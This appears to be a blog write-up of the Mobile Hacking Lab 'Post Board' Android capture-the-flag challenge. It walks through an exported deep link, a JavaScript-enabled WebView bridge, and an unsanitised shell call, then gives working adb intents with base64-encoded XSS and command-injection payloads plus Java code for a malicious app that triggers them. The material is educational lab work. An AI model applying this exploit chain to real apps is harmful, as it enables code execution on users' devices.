---
title:  "Mobile Hacking Lab Post Board Writeup"
date:   2024-01-22T16:27:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for [Post Board](https://www.mobilehackinglab.com/course/lab-postboard) challenge from Mobile Hacking Lab. 

## Static Analysis
When we open the app in emulator, it opens a page with "Post Message" button and a text input area. As mentioned on text input box, we can send markdown messages and that messages shown on same page. Let's open it with jadx to understand the app.

![](/assets/images_mhl_postboard/manifest.png)

When we examine the manifest file, we see that an intent filter is defined for MainActivity. To properly trigger this activity we need to send intent with `postboard` scheme, `postmessage` host and VIEW action.
```bash
# Sample intent
adb shell am start -n com.mobilehackinglab.postboard/.MainActivity -a android.intent.action.VIEW -d postboard://postmessage/blabla
```
But we need to know what happened when this activity triggered. To undestand this, lets analyze MainActivity.

![](/assets/images_mhl_postboard/mainactivity.png)
 
Inside the onCreate function,initialize method will be called from CowsayUtil class. After that setupWebView and handleIntent methods will be called.

### CowsayUtil Initialize

![](/assets/images_mhl_postboard/cowsayutil.png)

In the initialize function, the cowsay.sh script is taken from the assets folder and move to the files directory under app local data storage. After it is set as executable, the location of this script is written to the scriptPath variable.

![](/assets/images_mhl_postboard/cowsayfiles.png)

If you look at the content of the cowsay.sh file, you can see that it has almost the same function as the cowsay command that can be used on Linux systems.

### setupWebView Function

![](/assets/images_mhl_postboard/setupwebview.png)

In this function, a webview object taken as argument and javascript execution enabled for this webview. After that a WebAppInterface object added to webview with [addJavaScriptInterface method](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)). It means that we can access WebAppInterfaces's functions from our webview. 
```md
Functions inside WebAppInterface class:
- clearCache
- getMessages
- postMarkdownMessage
- postCowsayMessage

!!!NOTE!!!: Only public methods that are annotated with JavascriptInterface can be accessed from JavaScript.
```

### handleIntent Function

![](/assets/images_mhl_postboard/handleintent.png)

handleIntent function handle the coming intent and after checking the action and uri, gets the path section of uri(it drops the "/" char) and base64 decode the path. With this decoded message it calls postMarkDownMessage method from WebAppInterface. This method process our message with markdown syntaxes and write on the page. During base64 decoding url-safe decoding mode will be using([as mentioned with "8" number on code](https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/util/Base64.java#60)).

For example, if you want to write "hello" to board, the proper intent will be this:
```bash
#base64("hello") -> aGVsbG8
adb shell am start -n com.mobilehackinglab.postboard/.MainActivity -a android.intent.action.VIEW -d "postboard://postmessage/aGVsbG8"
```
![](/assets/images_mhl_postboard/intent1.png)

It works. As we mentioned earlier, javascript executrion is enabled on this webview. Lets try basic xss payload 😈

```bash
#base64("<img src=x onerror=alert(1337)>") -> PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEzMzcpPg
adb shell am start -n com.mobilehackinglab.postboard/.MainActivity -a android.intent.action.VIEW -d "postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEzMzcpPg"
```
![](./assets/images_mhl_postboard/intent2.png)

It works🎉 We can execute javascript inside webview. As we mentioned on setuprWebview function, we can access the methods inside webappinterface. Lets try postCowsayMessage method. For invoking that method from js, we can use this intent:
```bash
#base64("<img src=x onerror=WebAppInterface.postCowsayMessage("moo")>") -> PGltZyBzcmM9eCBvbmVycm9yPVdlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgibW9vIik-

adb shell am start -n com.mobilehackinglab.postboard/.MainActivity -a android.intent.action.VIEW -d "postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPVdlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgibW9vIik-"

```
![](/assets/images_mhl_postboard/intent3.png)

It works like standart cowsay command 🐄 But how this cowsay.sh called inside apk?

```java
@JavascriptInterface
    public final void postCowsayMessage(String cowsayMessage) {
        Intrinsics.checkNotNullParameter(cowsayMessage, "cowsayMessage");
        String asciiArt = CowsayUtil.Companion.runCowsay(cowsayMessage);
        String html = StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(asciiArt, "&", "&amp;", false, 4, (Object) null), "<", "&lt;", false, 4, (Object) null), ">", "&gt;", false, 4, (Object) null), "\"", "&quot;", false, 4, (Object) null), "'", "&#039;", false, 4, (Object) null);
        this.cache.addMessage("<pre>" + StringsKt.replace$default(html, "\n", "<br>", false, 4, (Object) null) + "</pre>");
    }
```
postCowsayMessage method calls `runCowsay` method from CowsayUtil class.

![](/assets/images_mhl_postboard/runCowsay.png)

Here path of cowsay script and message passed to shell without any validation. This problem may leads to command injection attack. Lets try it:
```bash
#base64("<img src=x onerror=WebAppInterface.postCowsayMessage("moo;pwd;whoami;")>") -> PGltZyBzcmM9eCBvbmVycm9yPVdlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgibW9vO3B3ZDt3aG9hbWk7Iik-

adb shell am start -n com.mobilehackinglab.postboard/.MainActivity -a android.intent.action.VIEW -d "postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPVdlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgibW9vO3B3ZDt3aG9hbWk7Iik-"

```
![](/assets/images_mhl_postboard/intent4.png)

Yess we get code execution🎉 If you want to get code exection with malicious app, here is my sample code:

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Uri uri = Uri.parse("postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPVdlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgibW9vO3B3ZDt3aG9hbWk7Iik-");
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setClassName("com.mobilehackinglab.postboard","com.mobilehackinglab.postboard.MainActivity");
        intent.setData(uri);
        startActivity(intent);
    }
}
```
Thanks for reading! See you in next writeups 👋🏻👋🏻
